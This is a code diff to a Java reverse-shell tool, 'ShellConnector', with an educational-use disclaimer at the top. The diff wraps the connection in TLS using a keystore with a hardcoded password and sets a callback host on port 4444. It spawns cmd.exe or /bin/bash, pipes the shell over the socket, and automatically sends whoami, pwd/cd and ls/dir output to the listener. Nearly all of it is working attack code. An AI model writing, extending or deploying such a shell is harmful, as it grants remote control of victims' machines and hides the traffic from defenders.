@@ -1,11 +1,43 @@
+/*
+This code is provided for educational and authorized security testing purposes ONLY.
+
+By using this code, you agree that:
+1. You have explicit permission to test the target system.
+2. The author takes NO responsibility for misuse, damages, or legal consequences.
+3. Unauthorized use on systems you do not own or have permission for is ILLEGAL.
+
+Always act ethically and responsibly.
+*/
 package NetworkShell;
 
+import javax.net.ssl.*;
 import java.io.*;
 import java.net.InetAddress;
 import java.net.Socket;
 import java.net.UnknownHostException;
+import java.security.KeyStore;
 
 public class ShellConnector {
+
+    public static SSLSocket createTLSSocket(String host, int port) throws Exception {
+        KeyStore keyStore = KeyStore.getInstance("JKS");
+        try (FileInputStream fileInputStream = new FileInputStream("/NetworkShell/shellkeystore.jks")) {
+            keyStore.load(fileInputStream, "password".toCharArray());
+        }
+        KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance("SunX509");
+        keyManagerFactory.init(keyStore, "password".toCharArray());
+
+        TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance("SunX509");
+        trustManagerFactory.init(keyStore);
+
+        SSLContext sslContext = SSLContext.getInstance("TLS");
+        sslContext.init(keyManagerFactory.getKeyManagers(), trustManagerFactory.getTrustManagers(), null);
+
+
+        SSLSocketFactory factory = sslContext.getSocketFactory();
+        return (SSLSocket) factory.createSocket(host, port);
+
+    }
 
     public static void Shell(Process process, Socket socket) throws Exception {
         InputStream processInput = process.getInputStream();
@@ -29,7 +61,8 @@ public class ShellConnector {
                     }
                     Thread.sleep(50);
                 }
-            } catch (Exception ignored) {}
+            } catch (Exception ignored) {
+            }
         });
         processToSocket.start();
 
@@ -68,7 +101,8 @@ public class ShellConnector {
             try {
                 socketOutput.write(("Error running command " + command + ": " + e.getMessage() + "\n").getBytes());
                 socketOutput.flush();
-            } catch (Exception ignored) {}
+            } catch (Exception ignored) {
+            }
         }
     }
 
@@ -82,7 +116,7 @@ public class ShellConnector {
             throw new RuntimeException(e);
         }
 
-        String host = "192.168.1.92";
+        String host = "192.168.1.123";
         int port = 4444;
 
         System.out.println("Device IP: " + myIp);
@@ -95,12 +129,27 @@ public class ShellConnector {
                         new ProcessBuilder("cmd.exe").redirectErrorStream(true).start() :
                         new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();
 
-                Socket socket = new Socket(host, port);
+                SSLSocket socket = createTLSSocket(host, port);
+                socket.startHandshake();
                 OutputStream socketOutput = socket.getOutputStream();
 
-                autoDeploy(socketOutput, "whoami");
-                autoDeploy(socketOutput, "pwd");
-                autoDeploy(socketOutput, "ls");
+                new Thread(() -> {
+                    try {
+                        if (os.contains("win")) {
+                            autoDeploy(socketOutput, "whoami");
+                            autoDeploy(socketOutput, "cd");
+                            autoDeploy(socketOutput, "dir");
+                            
+                        } else {
+                            autoDeploy(socketOutput, "whoami");
+                            autoDeploy(socketOutput, "pwd");
+                            autoDeploy(socketOutput, "ls");
+                        }
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }).start();
+
                 Shell(process, socket);
 
             } catch (Exception e) {
